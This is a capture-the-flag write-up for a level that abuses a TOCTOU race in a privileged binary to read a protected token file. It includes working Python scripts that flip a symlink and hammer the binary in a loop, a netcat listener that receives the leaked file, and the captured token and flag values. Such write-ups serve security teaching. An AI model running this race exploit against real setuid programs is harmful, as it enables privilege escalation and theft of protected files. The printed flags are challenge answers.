## Phase 1: Reconnaissance

Upon connecting to the level, we find two files in the home directory:
- A binary named `level10`
- A data file named `token`

Running the binary shows that it expects **two arguments**:
- a file path
- a host

From the usage message, it is clear that the program attempts to **send the contents of a file to a remote host**, but only if the user has permission to read that file
> So we can't send back our `token` file yet but instead we can send a file we create in `/tmp/`  
> So this is already obvious it's some redirection attack

---

## Phase 2: Static Analysis

We copy the binary to our local machine and decompile it using **dogbolt.org** to understand its logic

The simplified C code looks like this:

```c
int main(int argc, char **argv)
{
    if (argc < 3)
    {
        printf("%s file host\n sends file to host if you have access to it\n", *argv);
        exit(1);
    }

    if (access(argv[1], R_OK) == 0)               // checks if user has read access to path argv[1]
    {
        printf("Connecting to %s:6969 .. ", argv[2]);

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        connect(sock, ...);                      // connect to network

        write(sock, ".*( )*.\n", 8);             // write header file

        int fd = open(argv[1], O_RDONLY);        // open path for reading located at argv[1]
        read(fd, buffer, 4096);
        write(sock, buffer, bytesread);

        puts("wrote file!");
    }
    else
    {
        printf("You don't have access to %s\n", argv[1]);
    }
}
```

From this code, we learn that:
- The program checks file permissions using `access()`
- If allowed by access, it later opens the file using `open()`
- The file contents are then sent to a remote host on port **6969**

---

## Phase 3: Vulnerability

The vulnerability lies in this order of code:

```c
access(argv[1], R_OK);
open(argv[1], O_RDONLY);
```

This is a **TOCTOU (Time-Of-Check to Time-Of-Use)** race condition

What this means:
- `access()` checks permissions on a file
- There is a time window before `open()` is called
- If the file is changed in between, `open()` may actually open and read a **different file**

Since the binary runs with elevated privileges, this can be abused to read the protected `token` file

---

## Phase 4: Exploitation

To exploit this race condition, we use a **symbolic link**:
- During the `access()` check, the symlink points to a readable file
- Before `open()` runs, the symlink is switched to point to `token`


Because our binary calls these functions extremely fast, we must make two scripts:
1. One script rapidly spam flips the symlink target (example: between /tmp/randomfile and token)  
2. Another script repeatedly executes our binary

---

## Phase 5: Exploit Scripts

We need to run these 2 scripts in parallel on the same session

### Symlink Flipper (`/tmp/exploit.py`)

```python
import subprocess
import os

target = "/home/user/level10/token"
tmp = "/tmp/spookymsg"
link = "/tmp/spoolink"

subprocess.call("echo 'this is a spooky message' > %s" % tmp, shell=True)

while True:
    try:
        os.unlink(link)
    except:
        pass
    try:
        os.symlink(tmp, link)
    except:
        pass
    try:
        os.unlink(link)
    except:
        pass
    try:
        os.symlink(target, link)
    except:
        pass
```

This script continuously switches `/tmp/spoolink` between:
- a readable file (`/tmp/spookymsg`)
- the protected `token` file

---

### Binary Spammer (`/tmp/exploit2.py`)

```python
import subprocess

ip = "REPLACE_WITH_YOUR_IP"
link = "/tmp/spoolink"

while True:
    subprocess.call("/home/user/level10/level10 %s %s" % (link, ip), shell=True)
```

This script continuously calls the vulnerable binary, increasing the chance of winning the race condition

---

## Phase 6: Getting the Flag

While both scripts are running:
- We listen on port **6969** on our host machine with `nc -lvkp 6969`
- Eventually among the spam, the race condition succeeds
- The contents of the `token` file are sent over the network

```console
woupa2yuojeeaaed06riuj63c
```

Using the leaked token, we can then switch to `flag10` and retrieve the final flag
```
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

